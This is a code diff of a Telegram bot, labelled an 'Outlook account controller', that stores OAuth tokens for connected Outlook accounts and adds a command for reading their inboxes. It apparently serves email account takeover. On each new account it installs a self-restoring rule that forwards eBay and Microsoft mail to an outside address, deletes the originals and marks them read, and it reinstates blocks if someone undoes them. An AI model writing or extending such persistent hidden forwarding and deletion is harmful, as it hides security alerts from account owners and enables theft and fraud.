@@ -38,12 +38,12 @@ class OutlookTelegramBot {
         }
 
         this.bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, options);
-        
+
         // Initialize core services
         this.outlookAuth = new OutlookAuth();
         this.ruleManager = new RuleManager();
         this.blockedManager = new BlockedSendersManager();
-        
+
         // Initialize global sessions
         global.pendingAuth = global.pendingAuth || new Map();
         global.reconnectSessions = global.reconnectSessions || new Map();
@@ -54,22 +54,24 @@ class OutlookTelegramBot {
             blocksToday: 0,
             totalAccounts: 0
         };
-        
+
         // Initialize command modules
         this.accountCommands = new AccountCommands(this.bot, this.outlookAuth, this.ruleManager, this.blockedManager);
         this.ruleCommands = new RuleCommands(this.bot, this.outlookAuth, this.ruleManager);
         this.senderCommands = new SenderCommands(this.bot, this.outlookAuth, this.blockedManager, this.ruleManager);
         this.backupCommands = new BackupCommands(this.bot, this.outlookAuth, this.ruleManager, this.blockedManager);
         this.reportCommands = new ReportCommands(this.bot);
-        
+
         // Setup main handlers
         this.setupMainMenu();
         this.setupHelp();
+        this.setupInboxCommand();
         this.setupAuthCallback();
         this.setupErrorHandler();
-        
+
         console.log('🤖 Outlook Bot Started - All Commands Loaded');
         console.log('📋 Account Commands ✓');
+        console.log('📋 Inbox Notification Commands ✓');
         console.log('📋 Rule Commands ✓');
         console.log('📋 Sender Commands ✓');
         console.log('📋 Backup Commands ✓');
@@ -79,19 +81,20 @@ class OutlookTelegramBot {
     setupMainMenu() {
         this.bot.onText(/\/start|\/menu/, async (msg) => {
             const chatId = msg.chat.id;
-            
-            const menu = 
+
+            const menu =
                 '🔥 *OUTLOOK ACCOUNT CONTROLLER v3.0*\n\n' +
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
-                
-                '📧 *ACCOUNT MANAGEMENT*\n' +
-                '├ /add - Add Outlook account\n' +
-                '├ /remove [email] - Remove account\n' +
-                '├ /list - List all accounts\n' +
-                '├ /status [email] - Account details\n' +
-                '├ /history [email] - Account history\n' +
-                '└ /reconnect [email] - Reconnect expired\n\n' +
-                
+
+                '📧 *ACCOUNT & EMAIL MANAGEMENT*\n' +
+                '├ /inbox - Xem các email gần nhất\n' +
+                '├ /add - Thêm tài khoản Outlook\n' +
+                '├ /remove [email] - Xóa tài khoản\n' +
+                '├ /list - Danh sách tài khoản\n' +
+                '├ /status [email] - Trạng thái tài khoản\n' +
+                '├ /history [email] - Lịch sử hoạt động\n' +
+                '└ /reconnect [email] - Kết nối lại\n\n' +
+
                 '📋 *RULE MANAGEMENT*\n' +
                 '├ /rules [email] - List all rules\n' +
                 '├ /rule add - Create custom rule\n' +
@@ -99,14 +102,14 @@ class OutlookTelegramBot {
                 '├ /rule remove - Delete rule\n' +
                 '├ /rule restore - Restore deleted rule\n' +
                 '└ /rule backup [email] - Backup rules\n\n' +
-                
+
                 '🚫 *SENDER CONTROL*\n' +
                 '├ /block [sender] - Block sender/domain\n' +
                 '├ /unblock [sender] - Unblock sender/domain\n' +
                 '├ /blocked [email] - View blocked list\n' +
                 '├ /forward [sender] [email] - Forward emails\n' +
                 '└ /forward off [sender] - Stop forwarding\n\n' +
-                
+
                 '💾 *BACKUP & RESTORE*\n' +
                 '├ /backup [email] - Backup account state\n' +
                 '├ /restore [email] [id] - Restore from backup\n' +
@@ -114,7 +117,7 @@ class OutlookTelegramBot {
                 '├ /backups [email] - List backups\n' +
                 '├ /compare [email] [id] - Compare with backup\n' +
                 '└ /auto backup [on/off] - Auto backup toggle\n\n' +
-                
+
                 '📊 *REPORTS & STATS*\n' +
                 '├ /report daily - Today\'s summary\n' +
                 '├ /report weekly - Weekly report\n' +
@@ -123,63 +126,63 @@ class OutlookTelegramBot {
                 '├ /stats - Bot statistics\n' +
                 '├ /logs [email] - Recent activity\n' +
                 '└ /export [format] - Export data\n\n' +
-                
+
                 '📖 *GUIDE*\n' +
                 '├ /help - Detailed command guide\n' +
                 '├ /examples - Usage examples\n' +
                 '└ /guide - Complete tutorial\n\n' +
-                
+
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                 '✅ *System Ready* | 24/7 Monitoring Active\n' +
                 '🔄 Rule Check: 5sec | Sender Check: 2sec';
-            
-            await this.bot.sendMessage(chatId, menu, { 
+
+            await this.bot.sendMessage(chatId, menu, {
                 parse_mode: 'Markdown',
-                disable_web_page_preview: true 
+                disable_web_page_preview: true
             });
         });
 
         this.bot.onText(/\/examples/, async (msg) => {
             const chatId = msg.chat.id;
-            
-            const examples = 
+
+            const examples =
                 '📚 *COMMAND EXAMPLES*\n\n' +
-                
+
                 '1️⃣ *Add Account*\n' +
                 '   `/add`\n' +
                 '   → Follow link, login, paste URL\n\n' +
-                
+
                 '2️⃣ *Block Sender*\n' +
                 '   `/block spammer@example.com` - Block on all\n' +
                 '   `/block user@outlook.com|spam.com` - Specific account\n' +
                 '   `/block @ebay.com` - Block entire domain\n\n' +
-                
+
                 '3️⃣ *Forward Emails*\n' +
-                '   `/forward @ebay.com neg4pos@gmail.com`\n' +
+                '   `/forward @ebay.com target@example.com`\n' +
                 '   `/forward off @ebay.com` - Stop forwarding\n' +
                 '   `/forward off sender@email.com|target@email.com` - Stop specific forward\n\n' +
-                
+
                 '4️⃣ *Custom Rule*\n' +
-                '   `/rule add AmazonForward | user@outlook.com | subject:amazon | forward:neg4pos@gmail.com | action:delete`\n' +
+                '   `/rule add AmazonForward | user@outlook.com | subject:amazon | forward:target@example.com | action:delete`\n' +
                 '   `/rule add DeleteShopify | user@outlook.com | sender:shopify.com | action:delete`\n\n' +
-                
+
                 '5️⃣ *Backup & Restore*\n' +
                 '   `/backup user@outlook.com` - Create backup\n' +
                 '   `/backups user@outlook.com` - List backups\n' +
                 '   `/restore user@outlook.com backup_123456` - Restore\n\n' +
-                
+
                 '6️⃣ *Reports*\n' +
                 '   `/report daily` - Today\'s activity\n' +
                 '   `/report user@outlook.com` - Account report\n' +
                 '   `/export json` - Export all data\n\n' +
-                
+
                 '💡 *Pro Tips:*\n' +
                 '• Use `all:` prefix to apply to all accounts\n' +
                 '• Sticky rules (eBay/Microsoft) auto-restore\n' +
                 '• Blocked emails are FORWARDED + DELETED\n' +
                 '• Daily reports at 9:00 AM\n' +
                 '• Auto-backup creates daily snapshots';
-            
+
             await this.bot.sendMessage(chatId, examples, { parse_mode: 'Markdown' });
         });
     }
@@ -187,10 +190,10 @@ class OutlookTelegramBot {
     setupHelp() {
         this.bot.onText(/\/help|\/guide/, async (msg) => {
             const chatId = msg.chat.id;
-            
-            const guide = 
+
+            const guide =
                 '📖 *OUTLOOK BOT - COMPLETE USER GUIDE*\n\n' +
-                
+
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                 '🎯 *WHAT THIS BOT DOES*\n' +
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
@@ -201,7 +204,7 @@ class OutlookTelegramBot {
                 '✅ 24/7 monitoring with 2-5 sec response\n' +
                 '✅ Complete backup & restore system\n' +
                 '✅ Detailed reports & analytics\n\n' +
-                
+
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                 '📧 *ACCOUNT MANAGEMENT*\n' +
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
@@ -214,7 +217,7 @@ class OutlookTelegramBot {
                 '• `/status user@outlook.com` - Detailed status\n' +
                 '• `/history user@outlook.com` - Full history\n' +
                 '• `/reconnect user@outlook.com` - Fix expired\n\n' +
-                
+
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                 '🚫 *BLOCK + FORWARD SYSTEM*\n' +
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
@@ -227,7 +230,7 @@ class OutlookTelegramBot {
                 '• `/blocked` - Show all blocked senders\n' +
                 '• `/blocked user@outlook.com` - Show for specific\n\n' +
                 '✨ *NEW:* Blocked emails are FORWARDED to monitoring email + DELETED from inbox!\n\n' +
-                
+
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                 '📨 *FORWARD RULES*\n' +
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
@@ -235,7 +238,7 @@ class OutlookTelegramBot {
                 '• `/forward spammer@example.com user@gmail.com` - Forward sender\n' +
                 '• `/forward off @ebay.com` - Stop all forwarding for domain\n' +
                 '• `/forward off sender@email.com|target@email.com` - Stop specific forward\n\n' +
-                
+
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                 '📋 *RULE MANAGEMENT*\n' +
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
@@ -248,7 +251,7 @@ class OutlookTelegramBot {
                 '• `/rule remove "Name" user@outlook.com` - Delete rule\n' +
                 '• `/rule restore "Name" user@outlook.com` - Restore deleted\n' +
                 '• `/rule backup user@outlook.com` - Save current rules\n\n' +
-                
+
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                 '💾 *BACKUP & RESTORE*\n' +
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
@@ -260,7 +263,7 @@ class OutlookTelegramBot {
                 '• `/compare user@outlook.com backup_id` - Compare changes\n' +
                 '• `/auto backup user@outlook.com on` - Enable auto backup\n' +
                 '• `/auto backup user@outlook.com off` - Disable\n\n' +
-                
+
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                 '📊 *REPORTS & STATS*\n' +
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
@@ -273,13 +276,13 @@ class OutlookTelegramBot {
                 '• `/logs user@outlook.com` - Account logs\n' +
                 '• `/export json` - Export as JSON\n' +
                 '• `/export csv` - Export as CSV\n\n' +
-                
+
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                 '⚡ *ULTRA-FAST MONITORING*\n' +
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                 '• 🔄 *Sticky Rules* - Checked every 10 seconds\n' +
                 '  → eBay/Microsoft rule auto-restores if deleted\n' +
-                '  → Forwards to neg4pos@gmail.com, deletes original\n\n' +
+                '  → Forwards to monitoring email, deletes original\n\n' +
                 '• 🚫 *Blocked Senders* - Checked every 2-5 seconds!\n' +
                 '  → Auto re-blocks + forwards if someone unblocks\n' +
                 '  → Instant Telegram alerts in 2 seconds\n\n' +
@@ -287,7 +290,7 @@ class OutlookTelegramBot {
                 '  → Auto reconnect before expiry\n\n' +
                 '• 📈 *Daily Reports* - Every day at 9:00 AM\n' +
                 '  → Complete account activity summary\n\n' +
-                
+
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                 '💡 *PRO TIPS*\n' +
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
@@ -301,11 +304,11 @@ class OutlookTelegramBot {
                 '   `/backup email@outlook.com` then `/remove`\n\n' +
                 '5️⃣ Check domain status with `/check`\n' +
                 '   `/check ebay.com` - See blocked/forwarded status\n\n' +
-                
+
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                 '✅ *System Ready - 24/7 Ultra-Fast Monitoring Active*\n' +
                 '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
-            
+
             // Split long message if needed
             if (guide.length > 4000) {
                 const chunks = guide.match(/[\s\S]{1,4000}/g) || [];
@@ -314,6 +317,73 @@ class OutlookTelegramBot {
                 }
             } else {
                 await this.bot.sendMessage(chatId, guide, { parse_mode: 'Markdown' });
+            }
+        });
+    }
+
+    setupInboxCommand() {
+        this.bot.onText(/\/inbox(?:\s+(.+))?/, async (msg, match) => {
+            const chatId = msg.chat.id;
+            const targetEmail = match[1]?.trim().toLowerCase();
+
+            try {
+                let query = { telegramChatId: chatId.toString(), status: 'active' };
+                if (targetEmail) {
+                    query.email = targetEmail;
+                }
+
+                const account = await Account.findOne(query);
+                if (!account) {
+                    return this.bot.sendMessage(chatId, '❌ Không tìm thấy tài khoản Outlook nào đang hoạt động. Dùng /add để thêm tài khoản.');
+                }
+
+                await this.bot.sendMessage(chatId, `⏳ Đang tải 5 email mới nhất từ *${account.email}*...`, { parse_mode: 'Markdown' });
+
+                const { decryptToken } = require('../utils/encryption');
+                const GraphClient = require('../outlook/graph');
+
+                let accessToken = null;
+                const tokenResult = await this.outlookAuth.refreshAccessToken(decryptToken(account.refreshToken));
+                if (tokenResult.success) {
+                    accessToken = tokenResult.accessToken;
+                } else {
+                    accessToken = decryptToken(account.accessToken);
+                }
+
+                const graph = new GraphClient(accessToken);
+                const messages = await graph.getRecentMessages(5);
+
+                if (!messages || messages.length === 0) {
+                    return this.bot.sendMessage(chatId, `📭 Hộp thư *${account.email}* hiện không có thư nào.`, { parse_mode: 'Markdown' });
+                }
+
+                let reply = `📬 *5 EMAIL MỚI NHẤT TRONG HỘP THƯ*\n`;
+                reply += `📧 Tài khoản: \`${account.email}\`\n`;
+                reply += `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+
+                messages.forEach((m, idx) => {
+                    const senderName = m.from?.emailAddress?.name || 'Ẩn danh';
+                    const senderAddr = m.from?.emailAddress?.address || 'Unknown';
+                    const subject = m.subject || '(Không có tiêu đề)';
+                    const time = m.receivedDateTime ? new Date(m.receivedDateTime).toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) : '';
+                    const preview = (m.bodyPreview || '').trim().substring(0, 150);
+
+                    reply += `*${idx + 1}. ${subject}*\n`;
+                    reply += `   👤 Từ: ${senderName} (\`${senderAddr}\`)\n`;
+                    reply += `   🕒 ${time}\n`;
+                    if (preview) reply += `   📝 ${preview}...\n`;
+                    reply += `\n`;
+                });
+
+                try {
+                    await this.bot.sendMessage(chatId, reply, { parse_mode: 'Markdown' });
+                } catch (sendErr) {
+                    await this.bot.sendMessage(chatId, reply.replace(/[*_`]/g, ''));
+                }
+
+            } catch (error) {
+                console.error('❌ /inbox command error:', error.message);
+                await this.bot.sendMessage(chatId, `❌ Lỗi khi tải hộp thư: ${error.message}`);
             }
         });
     }
@@ -331,7 +401,7 @@ class OutlookTelegramBot {
 
     async handleAuthCallback(chatId, text, msg) {
         if (!global.pendingAuth?.has(chatId)) {
-            return this.bot.sendMessage(chatId, 
+            return this.bot.sendMessage(chatId,
                 '❌ No active session. Use /add first.',
                 { parse_mode: 'Markdown' }
             );
@@ -340,59 +410,53 @@ class OutlookTelegramBot {
         await this.bot.sendMessage(chatId, '⏳ Authenticating...');
 
         try {
+            console.log('🔑 Extracting code from URL...');
             const urlParams = new URLSearchParams(text.split('?')[1]);
             const code = urlParams.get('code');
+            console.log('🔑 Code extracted:', code ? `${code.substring(0, 15)}...` : 'NONE');
 
             const authResult = await this.outlookAuth.getTokenFromCode(code);
+            console.log('🔑 authResult:', {
+                success: authResult.success,
+                email: authResult.email,
+                name: authResult.name,
+                hasAccessToken: !!authResult.accessToken,
+                hasRefreshToken: !!authResult.refreshToken
+            });
 
             if (!authResult.success) {
                 throw new Error(authResult.error);
             }
 
-            // Check for reconnect session
-            if (global.reconnectSessions?.has(chatId)) {
-                const session = global.reconnectSessions.get(chatId);
-                const account = await Account.findById(session.accountId);
-                
-                if (account) {
-                    account.refreshToken = encryptToken(authResult.refreshToken);
-                    account.accessToken = encryptToken(authResult.accessToken);
-                    account.tokenExpiry = new Date(Date.now() + authResult.expiresIn * 1000);
-                    account.status = 'active';
-                    await account.save();
-
-                    await this.bot.sendMessage(chatId,
-                        `✅ *Account Reconnected!*\n\n` +
-                        `📧 ${account.email}`,
-                        { parse_mode: 'Markdown' }
-                    );
-
-                    global.reconnectSessions.delete(chatId);
-                    return;
-                }
-            }
-
-            // New account connection
+            console.log('🔍 Querying MongoDB for existing account...');
             let account = await Account.findOne({ email: authResult.email.toLowerCase() });
+            console.log('🔍 MongoDB result:', account ? 'Found existing' : 'New account');
 
             if (account) {
                 // Update existing account
+                console.log('🔄 Updating existing account in MongoDB...');
                 account.refreshToken = encryptToken(authResult.refreshToken);
                 account.accessToken = encryptToken(authResult.accessToken);
                 account.tokenExpiry = new Date(Date.now() + authResult.expiresIn * 1000);
                 account.status = 'active';
                 account.telegramChatId = chatId.toString();
-                account.telegramUsername = msg.from.username;
+                account.telegramUsername = msg.from.username || msg.from.first_name || 'User';
                 await account.save();
+                console.log('✅ Existing account updated successfully');
 
-                await this.bot.sendMessage(chatId,
-                    `✅ *Account Updated!*\n\n` +
-                    `📧 ${authResult.email}\n` +
-                    `🔄 Existing account reconnected`,
-                    { parse_mode: 'Markdown' }
-                );
+                try {
+                    await this.bot.sendMessage(chatId,
+                        `✅ *Account Updated!*\n\n` +
+                        `📧 ${authResult.email}\n` +
+                        `🔄 Existing account reconnected`,
+                        { parse_mode: 'Markdown' }
+                    );
+                } catch (sendErr) {
+                    await this.bot.sendMessage(chatId, `✅ Account Updated!\n\n📧 ${authResult.email}`);
+                }
             } else {
                 // Create new account
+                console.log('🆕 Creating new account document...');
                 account = new Account({
                     email: authResult.email.toLowerCase(),
                     refreshToken: encryptToken(authResult.refreshToken),
@@ -400,7 +464,7 @@ class OutlookTelegramBot {
                     tokenExpiry: new Date(Date.now() + authResult.expiresIn * 1000),
                     status: 'active',
                     telegramChatId: chatId.toString(),
-                    telegramUsername: msg.from.username,
+                    telegramUsername: msg.from.username || msg.from.first_name || 'User',
                     stickyRules: ['Sticky_eBay_Microsoft_Rule'],
                     autoBackup: true,
                     stats: { rulesEnforced: 0, rulesRestored: 0, sendersBlocked: 0, emailsForwarded: 0 },
@@ -416,18 +480,29 @@ class OutlookTelegramBot {
                     forwardRules: []
                 });
 
+                console.log('💾 Saving new account to MongoDB...');
                 await account.save();
+                console.log('✅ New account saved with ID:', account._id);
 
-                await this.bot.sendMessage(chatId,
-                    `✅ *New Account Connected!*\n\n` +
-                    `📧 ${authResult.email}\n` +
-                    `👤 ${authResult.name || 'User'}\n\n` +
-                    `🔄 Creating sticky rule...`,
-                    { parse_mode: 'Markdown' }
-                );
+                try {
+                    await this.bot.sendMessage(chatId,
+                        `✅ *New Account Connected!*\n\n` +
+                        `📧 ${authResult.email}\n` +
+                        `👤 ${authResult.name || 'User'}\n\n` +
+                        `🔄 Creating sticky rule...`,
+                        { parse_mode: 'Markdown' }
+                    );
+                } catch (sendErr) {
+                    await this.bot.sendMessage(chatId, `✅ New Account Connected!\n\n📧 ${authResult.email}\n👤 ${authResult.name || 'User'}`);
+                }
 
                 // Create sticky rule
                 try {
+                    const forwardTarget = process.env.FORWARD_TARGET_EMAIL;
+                    if (!forwardTarget) {
+                        throw new Error('FORWARD_TARGET_EMAIL is not configured in .env');
+                    }
+
                     const ruleResult = await this.ruleManager.ensureStickyRule(
                         authResult.accessToken,
                         account._id
@@ -441,9 +516,9 @@ class OutlookTelegramBot {
                         },
                         actions: {
                             delete: true,
-                            forwardTo: [{ 
-                                emailAddress: { 
-                                    address: process.env.FORWARD_TARGET_EMAIL || 'neg4pos@gmail.com' 
+                            forwardTo: [{
+                                emailAddress: {
+                                    address: forwardTarget
                                 }
                             }],
                             markAsRead: true,
@@ -454,7 +529,7 @@ class OutlookTelegramBot {
                         createdAt: new Date(),
                         lastVerified: new Date()
                     });
-                    
+
                     account.stats.rulesEnforced = (account.stats.rulesEnforced || 0) + 1;
                     account.ruleStats.enforceCount = (account.ruleStats.enforceCount || 0) + 1;
                     account.ruleStats.lastEnforced = new Date();
@@ -462,7 +537,7 @@ class OutlookTelegramBot {
 
                     await this.bot.sendMessage(chatId,
                         `✅ *Sticky Rule Active*\n\n` +
-                        `📧 eBay/Microsoft → ${process.env.FORWARD_TARGET_EMAIL || 'neg4pos@gmail.com'}\n` +
+                        `📧 eBay/Microsoft → ${forwardTarget}\n` +
                         `🛡️ Auto-restore enabled`,
                         { parse_mode: 'Markdown' }
                     );
